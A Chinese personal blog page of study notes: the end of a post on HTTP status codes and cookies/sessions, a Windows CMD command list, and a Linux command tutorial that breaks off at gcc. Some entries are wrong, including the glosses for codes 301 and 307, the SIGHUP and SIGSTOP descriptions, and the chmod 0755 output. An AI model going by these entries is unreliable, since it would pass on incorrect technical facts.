-<h2 id="2-：操作成功收到，分析、接受"><a href="#2-：操作成功收到，分析、接受" class="headerlink" title="2**：操作成功收到，分析、接受"></a>2**：操作成功收到，分析、接受</h2><p>200——交易成功<br>201——提示知道新文件的URL</p>
-<p>202——接受和处理、但处理未完成</p>
-<p>203——返回信息不确定或不完整</p>
-<p>204——请求收到，但返回信息为空</p>
-<p>205——服务器完成了请求，用户代理必须复位当前已经浏览过的文件</p>
-<p>206——服务器已经完成了部分用户的GET请求</p>
-<h2 id="3-：完成此请求必须进一步处理"><a href="#3-：完成此请求必须进一步处理" class="headerlink" title="3**：完成此请求必须进一步处理"></a>3**：完成此请求必须进一步处理</h2><p>300——请求的资源可在多处得到</p>
-<p>301——删除请求数据</p>
-<p>302——在其他地址发现了请求数据</p>
-<p>303——建议客户访问其他URL或访问方式</p>
-<p>304——客户端已经执行了GET，但文件未变化</p>
-<p>305——请求的资源必须从服务器指定的地址得到</p>
-<p>306——前一版本HTTP中使用的代码，现行版本中不再使用</p>
-<p>307——申明请求的资源临时性删除</p>
-<h2 id="4-：请求包含一个错误语法或不能完成"><a href="#4-：请求包含一个错误语法或不能完成" class="headerlink" title="4**：请求包含一个错误语法或不能完成"></a>4**：请求包含一个错误语法或不能完成</h2><p>400——错误请求，如语法错误</p>
-<p>401——未授权</p>
-<p>HTTP 401.1 - 未授权：登录失败</p>
-<p>　　HTTP 401.2 - 未授权：服务器配置问题导致登录失败</p>
-<p>　　HTTP 401.3 - ACL 禁止访问资源</p>
-<p>　　HTTP 401.4 - 未授权：授权被筛选器拒绝</p>
-<p>HTTP 401.5 - 未授权：ISAPI 或 CGI 授权失败</p>
-<p>402——保留有效ChargeTo头响应</p>
-<p>403——禁止访问</p>
-<p>HTTP 403.1 禁止访问：禁止可执行访问</p>
-<p>　　HTTP 403.2 - 禁止访问：禁止读访问</p>
-<p>　　HTTP 403.3 - 禁止访问：禁止写访问</p>
-<p>　　HTTP 403.4 - 禁止访问：要求 SSL</p>
-<p>　　HTTP 403.5 - 禁止访问：要求 SSL 128</p>
-<p>　　HTTP 403.6 - 禁止访问：IP 地址被拒绝</p>
-<p>　　HTTP 403.7 - 禁止访问：要求客户证书</p>
-<p>　　HTTP 403.8 - 禁止访问：禁止站点访问</p>
-<p>　　HTTP 403.9 - 禁止访问：连接的用户过多</p>
-<p>　　HTTP 403.10 - 禁止访问：配置无效</p>
-<p>　　HTTP 403.11 - 禁止访问：密码更改</p>
-<p>　　HTTP 403.12 - 禁止访问：映射器拒绝访问</p>
-<p>　　HTTP 403.13 - 禁止访问：客户证书已被吊销</p>
-<p>　　HTTP 403.15 - 禁止访问：客户访问许可过多</p>
-<p>　　HTTP 403.16 - 禁止访问：客户证书不可信或者无效</p>
-<p>HTTP 403.17 - 禁止访问：客户证书已经到期或者尚未生效</p>
-<p>404——没有发现文件、查询或URl</p>
-<p>405——用户在Request-Line字段定义的方法不允许</p>
-<p>406——根据用户发送的Accept拖，请求资源不可访问</p>
-<p>407——类似401，用户必须首先在代理服务器上得到授权</p>
-<p>408——客户端没有在用户指定的饿时间内完成请求</p>
-<p>409——对当前资源状态，请求不能完成</p>
-<p>410——服务器上不再有此资源且无进一步的参考地址</p>
-<p>411——服务器拒绝用户定义的Content-Length属性请求</p>
-<p>412——一个或多个请求头字段在当前请求中错误</p>
-<p>413——请求的资源大于服务器允许的大小</p>
-<p>414——请求的资源URL长于服务器允许的长度</p>
-<p>415——请求资源不支持请求项目格式</p>
-<p>416——请求中包含Range请求头字段，在当前请求资源范围内没有range指示值，请求也不包含If-Range请求头字段</p>
-<p>417——服务器不满足请求Expect头字段指定的期望值，如果是代理服务器，可能是下一级服务器不能满足请求长。</p>
-<h2 id="5-：服务器执行一个完全有效请求失败"><a href="#5-：服务器执行一个完全有效请求失败" class="headerlink" title="5**：服务器执行一个完全有效请求失败"></a>5**：服务器执行一个完全有效请求失败</h2><p>　　HTTP 500 - 内部服务器错误</p>
-<p>　　HTTP 500.100 - 内部服务器错误 - ASP 错误</p>
-<p>　　HTTP 500-11 服务器关闭</p>
-<p>　　HTTP 500-12 应用程序重新启动</p>
-<p>　　HTTP 500-13 - 服务器太忙</p>
-<p>　　HTTP 500-14 - 应用程序无效</p>
-<p>　　HTTP 500-15 - 不允许请求 global.asa</p>
-<p>　　Error 501 - 未实现</p>
-<p>HTTP 502 - 网关错误</p>
-<h1 id="Cookie和Session"><a href="#Cookie和Session" class="headerlink" title="Cookie和Session"></a>Cookie和Session</h1><p>Cookie和Session都为了用来保存状态信息，都是保存客户端状态的机制，它们都是为了解决HTTP无状态的问题而所做的努力。</p>
-<p>Session可以用Cookie来实现，也可以用URL回写的机制来实现。用Cookie来实现的Session可以认为是对Cookie更高级的应用。</p>
-<h2 id="两者比较"><a href="#两者比较" class="headerlink" title="两者比较"></a>两者比较</h2><p>Cookie和Session有以下明显的不同点：</p>
-<p>1）Cookie将状态保存在客户端，Session将状态保存在服务器端；</p>
-<p>2）Cookies是服务器在本地机器上存储的小段文本并随每一个请求发送至同一个服务器。Cookie最早在RFC2109中实现，后续RFC2965做了增强。网络服务器用HTTP头向客户端发送cookies，在客户终端，浏览器解析这些cookies并将它们保存为一个本地文件，它会自动将同一服务器的任何请求缚上这些cookies。Session并没有在HTTP的协议中定义；</p>
-<p>3）Session是针对每一个用户的，变量的值保存在服务器上，用一个sessionID来区分是哪个用户session变量,这个值是通过用户的浏览器在访问的时候返回给服务器，当客户禁用cookie时，这个值也可能设置为由get来返回给服务器；</p>
-<p>4）就安全性来说：当你访问一个使用session 的站点，同时在自己机子上建立一个cookie，建议在服务器端的SESSION机制更安全些.因为它不会任意读取客户存储的信息。</p>
-<h2 id="Session机制"><a href="#Session机制" class="headerlink" title="Session机制"></a>Session机制</h2><p>Session机制是一种服务器端的机制，服务器使用一种类似于散列表的结构（也可能就是使用散列表）来保存信息。</p>
-<p>当程序需要为某个客户端的请求创建一个session的时候，服务器首先检查这个客户端的请求里是否已包含了一个session标识 - 称为 session id，如果已包含一个session id则说明以前已经为此客户端创建过session，服务器就按照session id把这个 session检索出来使用（如果检索不到，可能会新建一个），如果客户端请求不包含session id，则为此客户端创建一个session并且生成一个与此session相关联的session id，session id的值应该是一个既不会重复，又不容易被找到规律以仿造的字符串，这个 session id将被在本次响应中返回给客户端保存。</p>
-<h2 id="Session的实现方式"><a href="#Session的实现方式" class="headerlink" title="Session的实现方式"></a>Session的实现方式</h2><h3 id="使用Cookie来实现"><a href="#使用Cookie来实现" class="headerlink" title="使用Cookie来实现"></a>使用Cookie来实现</h3><p>服务器给每个Session分配一个唯一的JSESSIONID，并通过Cookie发送给客户端。</p>
-<p>当客户端发起新的请求的时候，将在Cookie头中携带这个JSESSIONID。这样服务器能够找到这个客户端对应的Session。</p>
-<p>流程如下图所示：<br><img src="http://www.blogjava.net/images/blogjava_net/amigoxie/40799/o_http%e5%8d%8f%e8%ae%ae%e5%ad%a6%e4%b9%a0%e5%92%8c%e6%80%bb%e7%bb%93%e7%b3%bb%e5%88%97-3-1.jpg" alt=""></p>
-<h3 id="使用URL回显来实现"><a href="#使用URL回显来实现" class="headerlink" title="使用URL回显来实现"></a>使用URL回显来实现</h3><p>URL回写是指服务器在发送给浏览器页面的所有链接中都携带JSESSIONID的参数，这样客户端点击任何一个链接都会把JSESSIONID带会服务器。</p>
-<p>如果直接在浏览器输入服务端资源的url来请求该资源，那么Session是匹配不到的。</p>
-<p>Tomcat对Session的实现，是一开始同时使用Cookie和URL回写机制，如果发现客户端支持Cookie，就继续使用Cookie，停止使用URL回写。如果发现Cookie被禁用，就一直使用URL回写。jsp开发处理到Session的时候，对页面中的链接记得使用response.encodeURL() 。</p>
-<h2 id="在J2EE项目中Session失效的几种情况"><a href="#在J2EE项目中Session失效的几种情况" class="headerlink" title="在J2EE项目中Session失效的几种情况"></a>在J2EE项目中Session失效的几种情况</h2><p>1）Session超时：Session在指定时间内失效，例如30分钟，若在30分钟内没有操作，则Session会失效，例如在web.xml中进行了如下设置：<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;session-config&gt; </span><br><span class="line">        &lt;session-timeout&gt;30&lt;/session-timeout&gt; //单位：分钟</span><br><span class="line">    &lt;/session-config&gt;</span><br></pre></td></tr></table></figure></p>
-<p>2）使用session.invalidate()明确的去掉Session。</p>
-<h2 id="与Cookie相关的HTTP扩展头"><a href="#与Cookie相关的HTTP扩展头" class="headerlink" title="与Cookie相关的HTTP扩展头"></a>与Cookie相关的HTTP扩展头</h2><p>1）Cookie：客户端将服务器设置的Cookie返回到服务器；</p>
-<p>2）Set-Cookie：服务器向客户端设置Cookie；</p>
-<p>3）Cookie2 (RFC2965)）：客户端指示服务器支持Cookie的版本；</p>
-<p>4）Set-Cookie2 (RFC2965)：服务器向客户端设置Cookie。</p>
-<h2 id="Cookie的流程"><a href="#Cookie的流程" class="headerlink" title="Cookie的流程"></a>Cookie的流程</h2><p>服务器在响应消息中用Set-Cookie头将Cookie的内容回送给客户端，客户端在新的请求中将相同的内容携带在Cookie头中发送给服务器。从而实现会话的保持。</p>
-<p>流程如下图所示：</p>
-<p><img src="http://www.blogjava.net/images/blogjava_net/amigoxie/40799/o_http%e5%8d%8f%e8%ae%ae%e5%ad%a6%e4%b9%a0%e5%92%8c%e6%80%bb%e7%bb%93%e7%b3%bb%e5%88%97-3-2.jpg" alt=""></p>
-
-          
-        
-      
-    </div>
-
-    
-
-    
-    
-    
-
-    
-
-    
-      
-    
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://betterlh.github.io/2019/02/21/Windows常用命令/">
-
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="lh">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                
-                <a href="/2019/02/21/Windows常用命令/" class="post-title-link" itemprop="url">Windows常用命令</a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-
-              
-                
-              
-
-              <time title="Created: 2019-02-21 21:22:29" itemprop="dateCreated datePublished" datetime="2019-02-21T21:22:29+08:00">2019-02-21</time>
-            
-
-            
-              
-
-              
-                
-                <span class="post-meta-divider">|</span>
-                
-
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Edited on</span>
-                
-                <time title="Modified: 2019-03-02 10:40:08" itemprop="dateModified" datetime="2019-03-02T10:40:08+08:00">2019-03-02</time>
-              
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/命令/" itemprop="url" rel="index"><span itemprop="name">命令</span></a></span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>Windows常用命令<br><a href="https://www.cnblogs.com/qianjingchen/p/9549508.html" target="_blank" rel="noopener">https://www.cnblogs.com/qianjingchen/p/9549508.html</a><br><a href="http://www.cnblogs.com/sbaicl/archive/2013/03/05/2944001.html" target="_blank" rel="noopener">http://www.cnblogs.com/sbaicl/archive/2013/03/05/2944001.html</a><br>下面是有关常用网络命令的一篇博客<br><a href="https://blog.csdn.net/wz_cow/article/details/80864032" target="_blank" rel="noopener">https://blog.csdn.net/wz_cow/article/details/80864032</a></p>
-<p>附CMD比较常用命令集：<br>winver———检查Windows版本<br>wmimgmt.msc—-打开windows管理体系结构(WMI)<br>wupdmgr——–windows更新程序<br>wscript——–windows脚本宿主设置<br>write———-写字板<br>winmsd———系统信息<br>wiaacmgr——-扫描仪和照相机向导<br>winchat——–XP自带局域网聊天<br>mem.exe——–显示内存使用情况<br>Msconfig.exe—系统配置实用程序<br>mplayer2——-简易widnows media player<br>mspaint——–画图板<br>mstsc———-远程桌面连接<br>mplayer2——-媒体播放机<br>magnify——–放大镜实用程序<br>mmc————打开控制台<br>mobsync——–同步命令<br>dxdiag———检查DirectX信息<br>drwtsn32—— 系统医生<br>devmgmt.msc— 设备管理器<br>dfrg.msc——-磁盘碎片整理程序<br>diskmgmt.msc—磁盘管理实用程序<br>dcomcnfg——-打开系统组件服务<br>ddeshare——-打开DDE共享设置<br>dvdplay——–DVD播放器<br>net stop messenger—–停止信使服务<br>net start messenger—-开始信使服务<br>notepad——–打开记事本<br>nslookup——-网络管理的工具向导<br>ntbackup——-系统备份和还原<br>narrator——-屏幕“讲述人”<br>ntmsmgr.msc—-移动存储管理器<br>ntmsoprq.msc—移动存储管理员操作请求<br>netstat -an—-(TC)命令检查接口<br>syncapp——–创建一个公文包<br>sysedit——–系统配置编辑器<br>sigverif——-文件签名验证程序<br>sndrec32——-录音机<br>shrpubw——–创建共享文件夹<br>secpol.msc—–本地安全策略<br>syskey———系统加密，一旦加密就不能解开，保护windows xp系统的双重密码<br>services.msc—本地服务设置<br>Sndvol32——-音量控制程序<br>sfc.exe——–系统文件检查器<br>sfc /scannow—windows文件保护<br>tsshutdn——-60秒倒计时关机命令<br>tourstart——xp简介（安装完成后出现的漫游xp程序）<br>taskmgr——–任务管理器<br>eventvwr——-事件查看器<br>eudcedit——-造字程序<br>explorer——-打开资源管理器<br>packager——-对象包装程序<br>perfmon.msc—-计算机性能监测程序<br>progman——–程序管理器<br>regedit.exe—-注册表<br>rsop.msc——-组策略结果集<br>regedt32——-注册表编辑器<br>rononce -p —-15秒关机<br>regsvr32 /u *.dll—-停止dll文件运行<br>regsvr32 /u zipfldr.dll——取消ZIP支持<br>cmd.exe——–CMD命令提示符<br>chkdsk.exe—–Chkdsk磁盘检查<br>certmgr.msc—-证书管理实用程序<br>calc———–启动计算器<br>charmap——–启动字符映射表<br>cliconfg——-SQL SERVER 客户端网络实用程序<br>Clipbrd——–剪贴板查看器<br>conf———–启动netmeeting<br>compmgmt.msc—计算机管理<br>cleanmgr——-垃圾整理<br>ciadv.msc——索引服务程序<br>osk————打开屏幕键盘<br>odbcad32——-ODBC数据源管理器<br>oobe/msoobe /a—-检查XP是否激活<br>lusrmgr.msc—-本机用户和组<br>logoff———注销命令<br>iexpress——-木马捆绑工具，系统自带<br>Nslookup——-IP地址侦测器<br>fsmgmt.msc—–共享文件夹管理器<br>utilman——–辅助工具管理器</p>
-
-          
-        
-      
-    </div>
-
-    
-
-    
-    
-    
-
-    
-
-    
-      
-    
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://betterlh.github.io/2019/02/21/Linux常用命令/">
-
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="lh">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                
-                <a href="/2019/02/21/Linux常用命令/" class="post-title-link" itemprop="url">Linux常用命令</a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-
-              
-                
-              
-
-              <time title="Created: 2019-02-21 21:22:13" itemprop="dateCreated datePublished" datetime="2019-02-21T21:22:13+08:00">2019-02-21</time>
-            
-
-            
-              
-
-              
-                
-                <span class="post-meta-divider">|</span>
-                
-
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Edited on</span>
-                
-                <time title="Modified: 2019-03-02 19:30:46" itemprop="dateModified" datetime="2019-03-02T19:30:46+08:00">2019-03-02</time>
-              
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/命令/" itemprop="url" rel="index"><span itemprop="name">命令</span></a></span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p><a href="https://blog.csdn.net/ljianhui/article/details/11100625/#" target="_blank" rel="noopener">来源https://blog.csdn.net/ljianhui/article/details/11100625/#</a><br><a href="https://www.linuxidc.com/Linux/2018-04/151801.htm" target="_blank" rel="noopener">Linux常用命令详解-目录文件操作命令</a></p>
-<h1 id="1、cd命令"><a href="#1、cd命令" class="headerlink" title="1、cd命令"></a>1、cd命令</h1><p>这是一个非常基本，也是大家经常需要使用的命令，它用于切换当前目录，它的参数是要切换到的目录的路径，可以是绝对路径，也可以是相对路径。如：</p>
-<p>cd /root/Docements # 切换到目录/root/Docements<br>cd ./path          # 切换到当前目录下的path目录中，“.”表示当前目录<br>cd ../path         # 切换到上层目录中的path目录中，“..”表示上一层目录</p>
-<h1 id="2、ls命令"><a href="#2、ls命令" class="headerlink" title="2、ls命令"></a>2、ls命令</h1><p>这是一个非常有用的查看文件与目录的命令，list之意，它的参数非常多，下面就列出一些我常用的参数吧，如下：</p>
-<p>-l ：列出长数据串，包含文件的属性与权限数据等<br>-a ：列出全部的文件，连同隐藏文件（开头为.的文件）一起列出来（常用）<br>-d ：仅列出目录本身，而不是列出目录的文件数据<br>-h ：将文件容量以较易读的方式（GB，kB等）列出来<br>-R ：连同子目录的内容一起列出（递归列出），等于该目录下的所有文件都会显示出来<br>注：这些参数也可以组合使用，下面举两个例子：</p>
-<p>ls -l #以长数据串的形式列出当前目录下的数据文件和目录<br>ls -lR #以长数据串的形式列出当前目录下的所有文件</p>
-<h1 id="3、grep命令"><a href="#3、grep命令" class="headerlink" title="3、grep命令"></a>3、grep命令</h1><p>该命令常用于分析一行的信息，若当中有我们所需要的信息，就将该行显示出来，该命令通常与管道命令一起使用，用于对一些命令的输出进行筛选加工等等，它的简单语法为<br>grep [-acinv] [–color=auto] ‘查找字符串’ filename<br>它的常用参数如下：</p>
-<p>-a ：将binary文件以text文件的方式查找数据<br>-c ：计算找到‘查找字符串’的次数<br>-i ：忽略大小写的区别，即把大小写视为相同<br>-v ：反向选择，即显示出没有‘查找字符串’内容的那一行</p>
-<ul>
-<li>例如：</li>
-<li>取出文件/etc/man.config中包含MANPATH的行，并把找到的关键字加上颜色<br>grep –color=auto ‘MANPATH’ /etc/man.config</li>
-<li>把ls -l的输出中包含字母file（不区分大小写）的内容输出<br>ls -l | grep -i file<h1 id="4、find命令"><a href="#4、find命令" class="headerlink" title="4、find命令"></a>4、find命令</h1>find是一个基于查找的功能非常强大的命令，相对而言，它的使用也相对较为复杂，参数也比较多，所以在这里将给把它们分类列出，它的基本语法如下：</li>
-</ul>
-<p>find [PATH] [option] [action]</p>
-<ul>
-<li>与时间有关的参数：<br>-mtime n : n为数字，意思为在n天之前的“一天内”被更改过的文件；<br>-mtime +n : 列出在n天之前（不含n天本身）被更改过的文件名；<br>-mtime -n : 列出在n天之内（含n天本身）被更改过的文件名；<br>-newer file : 列出比file还要新的文件名</li>
-<li><p>例如：<br>find /root -mtime 0 # 在当前目录下查找今天之内有改动的文件</p>
-</li>
-<li><p>与用户或用户组名有关的参数：<br>-user name : 列出文件所有者为name的文件<br>-group name : 列出文件所属用户组为name的文件<br>-uid n : 列出文件所有者为用户ID为n的文件<br>-gid n : 列出文件所属用户组为用户组ID为n的文件</p>
-</li>
-<li><p>例如：<br>find /home/ljianhui -user ljianhui * 在目录/home/ljianhui中找出所有者为ljianhui的文件</p>
-</li>
-<li><p>与文件权限及名称有关的参数：<br>-name filename ：找出文件名为filename的文件<br>-size [+-]SIZE ：找出比SIZE还要大（+）或小（-）的文件<br>-tpye TYPE ：查找文件的类型为TYPE的文件，TYPE的值主要有：一般文件（f)、设备文件（b、c）、</p>
-<pre><code>目录（d）、连接文件（l）、socket（s）、FIFO管道文件（p）；
-</code></pre><p>-perm mode ：查找文件权限刚好等于mode的文件，mode用数字表示，如0755；<br>-perm -mode ：查找文件权限必须要全部包括mode权限的文件，mode用数字表示<br>-perm +mode ：查找文件权限包含任一mode的权限的文件，mode用数字表示</p>
-</li>
-<li>例如：<br>find / -name passwd # 查找文件名为passwd的文件<br>find . -perm 0755 # 查找当前目录中文件权限的0755的文件<br>find . -size +12k # 查找当前目录中大于12KB的文件，注意c表示byte<h1 id="5、cp命令"><a href="#5、cp命令" class="headerlink" title="5、cp命令"></a>5、cp命令</h1>该命令用于复制文件，copy之意，它还可以把多个文件一次性地复制到一个目录下，它的常用参数如下：</li>
-</ul>
-<p>-a ：将文件的特性一起复制<br>-p ：连同文件的属性一起复制，而非使用默认方式，与-a相似，常用于备份<br>-i ：若目标文件已经存在时，在覆盖时会先询问操作的进行<br>-r ：递归持续复制，用于目录的复制行为<br>-u ：目标文件与源文件有差异时才会复制<br>例如 ：</p>
-<p>cp -a file1 file2 #连同文件的所有特性把文件file1复制成文件file2<br>cp file1 file2 file3 dir #把文件file1、file2、file3复制到目录dir中</p>
-<h1 id="6、mv命令"><a href="#6、mv命令" class="headerlink" title="6、mv命令"></a>6、mv命令</h1><p>该命令用于移动文件、目录或更名，move之意，它的常用参数如下：</p>
-<p>-f ：force强制的意思，如果目标文件已经存在，不会询问而直接覆盖<br>-i ：若目标文件已经存在，就会询问是否覆盖<br>-u ：若目标文件已经存在，且比目标文件新，才会更新<br>注：该命令可以把一个文件或多个文件一次移动一个文件夹中，但是最后一个目标文件一定要是“目录”。</p>
-<p>例如：</p>
-<p>mv file1 file2 file3 dir # 把文件file1、file2、file3移动到目录dir中<br>mv file1 file2 # 把文件file1重命名为file2</p>
-<h1 id="7、rm命令"><a href="#7、rm命令" class="headerlink" title="7、rm命令"></a>7、rm命令</h1><p>该命令用于删除文件或目录，remove之间，它的常用参数如下：</p>
-<p>-f ：就是force的意思，忽略不存在的文件，不会出现警告消息<br>-i ：互动模式，在删除前会询问用户是否操作<br>-r ：递归删除，最常用于目录删除，它是一个非常危险的参数<br>例如：</p>
-<p>rm -i file # 删除文件file，在删除之前会询问是否进行该操作<br>rm -fr dir # 强制删除目录dir中的所有文件</p>
-<h1 id="8、ps命令"><a href="#8、ps命令" class="headerlink" title="8、ps命令"></a>8、ps命令</h1><p>该命令用于将某个时间点的进程运行情况选取下来并输出，process之意，它的常用参数如下：</p>
-<p>-A ：所有的进程均显示出来<br>-a ：不与terminal有关的所有进程<br>-u ：有效用户的相关进程<br>-x ：一般与a参数一起使用，可列出较完整的信息<br>-l ：较长，较详细地将PID的信息列出<br>其实我们只要记住ps一般使用的命令参数搭配即可，它们并不多，如下：</p>
-<p>ps aux # 查看系统所有的进程数据<br>ps ax # 查看不与terminal有关的所有进程<br>ps -lA # 查看系统所有的进程数据<br>ps axjf # 查看连同一部分进程树状态</p>
-<h1 id="9、kill命令"><a href="#9、kill命令" class="headerlink" title="9、kill命令"></a>9、kill命令</h1><p>该命令用于向某个工作（%jobnumber）或者是某个PID（数字）传送一个信号，它通常与ps和jobs命令一起使用，它的基本语法如下：<br>kill -signal PID<br>signal的常用参数如下：<br>注：最前面的数字为信号的代号，使用时可以用代号代替相应的信号。</p>
-<p>1：SIGHUP，启动被终止的进程<br>2：SIGINT，相当于输入ctrl+c，中断一个程序的进行<br>9：SIGKILL，强制中断一个进程的进行<br>15：SIGTERM，以正常的结束进程方式来终止进程<br>17：SIGSTOP，相当于输入ctrl+z，暂停一个进程的进行<br>例如：</p>
-<ul>
-<li>以正常的结束进程方式来终于第一个后台工作，可用jobs命令查看后台中的第一个工作进程<br>kill -SIGTERM %1 </li>
-<li>重新改动进程ID为PID的进程，PID可用ps命令通过管道命令加上grep命令进行筛选获得<br>kill -SIGHUP PID<h1 id="10、killall命令"><a href="#10、killall命令" class="headerlink" title="10、killall命令"></a>10、killall命令</h1>该命令用于向一个命令启动的进程发送一个信号，它的一般语法如下：<br>killall [-iIe] [command name]<br>它的参数如下：</li>
-</ul>
-<p>-i ：交互式的意思，若需要删除时，会询问用户<br>-e ：表示后面接的command name要一致，但command name不能超过15个字符<br>-I ：命令名称忽略大小写</p>
-<ul>
-<li>例如：<br>killall -SIGHUP syslogd # 重新启动syslogd<h1 id="11、file命令"><a href="#11、file命令" class="headerlink" title="11、file命令"></a>11、file命令</h1>该命令用于判断接在file命令后的文件的基本数据，因为在Linux下文件的类型并不是以后缀为分的，所以这个命令对我们来说就很有用了，它的用法非常简单，基本语法如下：</li>
-</ul>
-<p>file filename<br>*例如：<br>file ./test</p>
-<h1 id="12、tar命令"><a href="#12、tar命令" class="headerlink" title="12、tar命令"></a>12、tar命令</h1><p>该命令用于对文件进行打包，默认情况并不会压缩，如果指定了相应的参数，它还会调用相应的压缩程序（如gzip和bzip等）进行压缩和解压。它的常用参数如下：</p>
-<p>-c ：新建打包文件<br>-t ：查看打包文件的内容含有哪些文件名<br>-x ：解打包或解压缩的功能，可以搭配-C（大写）指定解压的目录，注意-c,-t,-x不能同时出现在同一条命令中<br>-j ：通过bzip2的支持进行压缩/解压缩<br>-z ：通过gzip的支持进行压缩/解压缩<br>-v ：在压缩/解压缩过程中，将正在处理的文件名显示出来<br>-f filename ：filename为要处理的文件<br>-C dir ：指定压缩/解压缩的目录dir<br>上面的解说可以已经让你晕过去了，但是通常我们只需要记住下面三条命令即可：</p>
-<p>压缩：tar -jcv -f filename.tar.bz2 要被处理的文件或目录名称<br>查询：tar -jtv -f filename.tar.bz2<br>解压：tar -jxv -f filename.tar.bz2 -C 欲解压缩的目录<br>注：文件名并不定要以后缀tar.bz2结尾，这里主要是为了说明使用的压缩程序为bzip2</p>
-<h1 id="13、cat命令"><a href="#13、cat命令" class="headerlink" title="13、cat命令"></a>13、cat命令</h1><p>该命令用于查看文本文件的内容，后接要查看的文件名，通常可用管道与more和less一起使用，从而可以一页页地查看数据。例如：</p>
-<p>cat text | less # 查看text文件中的内容</p>
-<ul>
-<li>注：这条命令也可以使用less text来代替<h1 id="14、chgrp命令"><a href="#14、chgrp命令" class="headerlink" title="14、chgrp命令"></a>14、chgrp命令</h1>该命令用于改变文件所属用户组，它的使用非常简单，它的基本用法如下：</li>
-</ul>
-<p>chgrp [-R] dirname/filename<br>-R ：进行递归的持续对所有文件和子目录更改</p>
-<ul>
-<li>例如：<br>chgrp users -R ./dir # 递归地把dir目录下中的所有文件和子目录下所有文件的用户组修改为users<h1 id="15、chown命令"><a href="#15、chown命令" class="headerlink" title="15、chown命令"></a>15、chown命令</h1>该命令用于改变文件的所有者，与chgrp命令的使用方法相同，只是修改的文件属性不同，不再详述。</li>
-</ul>
-<h1 id="16、chmod命令"><a href="#16、chmod命令" class="headerlink" title="16、chmod命令"></a>16、chmod命令</h1><p>该命令用于改变文件的权限，一般的用法如下：</p>
-<p>chmod [-R] xyz 文件或目录<br>-R：进行递归的持续更改，即连同子目录下的所有文件都会更改<br>同时，chmod还可以使用u（user）、g（group）、o（other）、a（all）和+（加入）、-（删除）、=（设置）跟rwx搭配来对文件的权限进行更改。</p>
-<ul>
-<li>例如：<br>chmod 0755 file # 把file的文件权限改变为-rxwr-xr-x<br>chmod g+w file # 向file的文件权限中加入用户组可写权限<h1 id="18、vim命令"><a href="#18、vim命令" class="headerlink" title="18、vim命令"></a>18、vim命令</h1>该命令主要用于文本编辑，它接一个或多个文件名作为参数，如果文件存在就打开，如果文件不存在就以该文件名创建一个文件。vim是一个非常好用的文本编辑器，它里面有很多非常好用的命令，在这里不再多说。你可以从这里下载vim常用操作的详细说明。</li>
-</ul>
-<h1 id="19、gcc命令"><a href="#19、gcc命令" class="headerlink" title="19、gcc命令"></a>19、gcc命令</h1><p>对于一个用Linux开发C程序的人来说，这个命令就非常重要了，它用于把C语言的源程序文件，编译成可执行程序，由于g++的很多参数跟它非常相似，所以这里只介绍gcc的参数，它的常用参数如下：</p>
